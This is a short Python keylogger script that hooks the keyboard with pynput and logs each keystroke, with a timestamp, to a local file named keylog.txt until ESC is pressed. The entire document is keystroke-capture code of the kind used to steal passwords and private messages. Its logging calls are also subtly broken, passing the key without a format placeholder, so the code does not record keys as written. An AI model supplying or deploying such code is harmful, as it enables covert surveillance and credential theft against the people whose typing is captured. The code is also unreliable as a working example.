from pynput import keyboard
import logging

logging.basicConfig(filename='keylog.txt',level=logging.DEBUG,format='%(asctime)s: %(message)s')


def on_press(key):
    try:
        logging.info("Key pressed: ", key.char)
    except AttributeError:
        logging.info("Special key pressed: ", key)
        if key == keyboard.Key.esc:
            return False


print("Keylogger is running. Press ESC to stop.")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()